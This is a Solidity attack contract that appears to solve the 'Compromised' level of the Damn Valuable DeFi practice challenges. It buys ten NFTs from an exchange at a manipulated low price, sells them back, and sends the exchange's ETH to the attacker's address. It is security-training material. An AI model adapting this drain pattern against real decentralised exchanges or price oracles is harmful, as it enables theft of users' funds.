pragma solidity 0.8.17;

import {Exchange} from "src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "src/Contracts/DamnValuableNFT.sol";
import {ERC721} from "openzeppelin-contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedAttack is ERC721 {
  Exchange exchange;
  TrustfulOracle trustfulOracle;
  TrustfulOracleInitializer trustfulOracleInitializer;
  DamnValuableNFT damnValuableNFT;
  address payable owner;

  constructor(
    address payable _exchange,
    address _trustfulOracle,
    address _trustfulOracleInitializer,
    address _damnValuableNFT
  ) ERC721("DamnValuableNFT", "DVNFT") {
    exchange = Exchange(_exchange);
    trustfulOracle = TrustfulOracle(_trustfulOracle);
    trustfulOracleInitializer = TrustfulOracleInitializer(_trustfulOracleInitializer);
    damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
    owner = payable(msg.sender);
  }

  uint256[10] public tokens;

  function attack() public payable {
    for (uint8 i = 0; i < tokens.length; i++) {
      tokens[i] = exchange.buyOne{value: 1}();
      damnValuableNFT.approve(address(exchange), tokens[i]);
    }
  }

  function attack2() public payable {
    for (uint8 i = 0; i < tokens.length; i++) {
      exchange.sellOne(tokens[i]);
      owner.call{value: address(this).balance}("");
    }
  }

  function onERC721Received(address, address, uint256, bytes calldata) public payable returns(bytes4) {
    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}
